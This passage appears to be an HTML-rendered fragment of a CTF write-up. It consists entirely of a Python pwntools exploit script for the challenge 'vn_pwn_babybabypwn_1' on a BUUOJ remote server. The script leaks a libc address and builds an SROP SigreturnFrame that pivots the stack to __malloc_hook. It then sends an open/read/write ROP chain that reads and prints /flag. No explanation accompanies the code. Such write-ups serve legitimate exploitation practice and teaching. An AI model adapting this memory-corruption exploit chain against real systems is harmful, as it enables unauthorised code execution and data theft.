>#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,timeout=<span class="number">1</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.Q:</span><br><span class="line">	io=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29793</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	io=process(<span class="string">'./vn_pwn_babybabypwn_1'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">sla=<span class="keyword">lambda</span> a,b:io.sendlineafter(a,b)</span><br><span class="line">sa=<span class="keyword">lambda</span> a,b:io.sendafter(a,b)</span><br><span class="line">sl=<span class="keyword">lambda</span> a:io.sendline(a)</span><br><span class="line">ru=<span class="keyword">lambda</span> a:io.recvuntil(a)</span><br><span class="line">rv=<span class="keyword">lambda</span> a:io.recv(a)</span><br><span class="line">ia=<span class="keyword">lambda</span> :io.interactive()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line">	ru(<span class="string">'gift: '</span>)</span><br><span class="line">	puts_leak=int(rv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">	log.success(<span class="string">'puts_leak==&gt;&#123;&#125;'</span>.format(hex(puts_leak)))</span><br><span class="line">	<span class="keyword">return</span> puts_leak</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(leak)</span>:</span></span><br><span class="line">	libc_base=leak-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">	open_addr=libc_base+libc.sym[<span class="string">'open'</span>]</span><br><span class="line">	pop_rdi=libc_base+<span class="number">0x0000000000021102</span></span><br><span class="line">	pop_rsi=libc_base+<span class="number">0x00000000000202e8</span></span><br><span class="line">	pop_rdx=libc_base+<span class="number">0x0000000000001b92</span></span><br><span class="line">	read_addr=libc_base+libc.sym[<span class="string">'read'</span>]</span><br><span class="line">	open_addr=libc_base+libc.sym[<span class="string">'open'</span>]</span><br><span class="line">	write_addr=libc_base+libc.sym[<span class="string">'write'</span>]</span><br><span class="line">	malloc_hook=libc_base+libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">	log.success(<span class="string">'read_addr==&gt;&#123;&#125;'</span>.format(hex(read_addr)))</span><br><span class="line"></span><br><span class="line">	frame = SigreturnFrame()</span><br><span class="line">	frame.rdi = <span class="number">0</span></span><br><span class="line">	frame.rsi = malloc_hook</span><br><span class="line">	frame.rdx = <span class="number">0x200</span></span><br><span class="line">	frame.rsp = malloc_hook</span><br><span class="line">	frame.rip = read_addr</span><br><span class="line">	payload =str(frame)[<span class="number">0x8</span>:]</span><br><span class="line">	sla(<span class="string">'message: '</span>,payload)</span><br><span class="line">	<span class="comment">##gdb.attach(io,'b read')</span></span><br><span class="line">	<span class="comment">#pause()</span></span><br><span class="line">	payload =p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(malloc_hook<span class="number">-8</span>)+p64(pop_rdx)+p64(<span class="number">8</span>)+p64(read_addr)</span><br><span class="line">	payload+=p64(pop_rdi)+p64(malloc_hook<span class="number">-8</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0</span>)+p64(open_addr)</span><br><span class="line">	payload+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(malloc_hook<span class="number">-0x40</span>)+p64(pop_rdx)+p64(<span class="number">0x40</span>)+p64(read_addr)</span><br><span class="line">	payload+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(write_addr)</span><br><span class="line">	sl(payload)</span><br><span class="line">	sl(<span class="string">'/flag\x00'</span>)</span><br><span class="line">	<span class="keyword">print</span> rv(<span class="number">0x40</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">	leak=leak()</span><br><span class="line">	pwn(leak)</span><br></pre></td></tr></table></figure>
